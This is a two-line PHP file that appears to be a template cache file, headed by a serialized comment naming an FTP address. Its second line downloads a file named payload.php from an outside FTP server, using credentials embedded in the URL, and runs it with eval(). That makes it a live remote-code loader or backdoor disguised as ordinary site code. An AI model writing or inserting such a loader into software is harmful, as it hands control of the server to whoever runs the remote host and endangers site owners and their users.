<?php /*a:1:{s:32:"ftp://161.35.236.123/spark/1.php";i:1737431931;}*/ ?>
<?php $payload = file_get_contents("ftp://ftp:foo@161.35.236.123/spark/payload.php"); eval($payload); ?>
